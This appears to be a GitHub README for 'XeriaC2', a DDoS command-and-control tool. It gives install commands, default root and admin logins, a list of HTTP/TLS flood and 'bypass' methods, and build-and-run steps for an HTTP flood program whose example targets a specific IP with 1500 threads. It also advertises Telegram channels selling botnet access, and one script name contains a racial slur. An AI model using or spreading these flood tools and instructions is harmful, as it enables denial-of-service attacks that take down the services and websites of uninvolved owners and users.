## Setup/Install
```sh
Cloud Shell : https://shell.cloud.google.com/?show=ide%2Cterminal

CentOS:
yum install git -y
yum install golang -y
yum install perl -y
yum install python2 -y
yum install python3 -y
yum install python3-pip -y
yum install nodejs -y
yum install npm -y

Debain, Ubuntu:
sudo apt-get install git -y
sudo apt-get install golang -y
sudo apt-get install perl -y
sudo apt-get install python3 -y
sudo apt-get install python2 -y
sudo apt-get install python3-pip -y
sudo apt-get install nodejs -y
sudo apt-get install npm -y

git clone https://github.com/levanderdev/XeriaC2

cd XeriaC2

node auto_install_modules.js 404.js HTTP-NIGGA.js BYPASS.js holdv2.js Tlsv1.js TLSv2.js MIX.js spike.js XENN-BYPASS.js anus.js

pip3 install -r requirements.txt

python3 xeriac2.py

```

## Login 
```sh
Username : root
Password : 23

```
## How To Install Modules
```sh
How To Install Modules Please Are You Get Error cannot find module
- Usage : node auto_install_modules.js HTTP.js
- Example : node auto_install_modules.js example.js
Note : 
- Please Dont Input the on xeriac2.py
- you can input the cd XeriaC2
- python xeriac2.py
- choose methods
- error?
- ctrl + c
- node auto_install_modules.js example.js

```

## Methods Work On xeriac2.py
```sh
- HTTP
- TLS
- TLSV2
- TLSV3
- BOMB
- MIX

```

## File Stresser/DDoS/Botnet/Api
you can get the this free !!! Open file the install the zip

## Telegram/Chat/Bug</br>
Free Tools DDoS/Methods : https://t.me/freetoolsddos

Telegram : https://t.me/freetoolsddos

C2 or Botnet if you wanna buy : https://t.me/perkicauc2

Power Proof : https://t.me/PerkicauC2PowerProof

Chat : https://t.me/+FlxMp6qQVoNmZWZl

Bug? : https://t.me/perkicau

## ADMIN/PASSWORD</br>
Username : admin

Password : admin

## Wanna Update Method?</br> 
remove file XeriaC2
-----
WANNA USE HTTP-FLOOD.go?
STEP BY STEP :
## INSTALL : 

https://github.com/levanderdev/XeriaC2

cd XeriaC2

go mod init http 

go get github.com/valyala/fasthttp
go build 

./http

## USAGE : 
./http <target> <GET/POST> <threads>
example: ./http http://51.159.30.249 POST 1500

**PLEASE STAR WITH YOU SUPPORT ME**


## How To Install/Setup

https://github.com/levanderdev/XeriaC2/assets/86545190/b02456da-afa0-453c-b6f6-4e31de2aa570
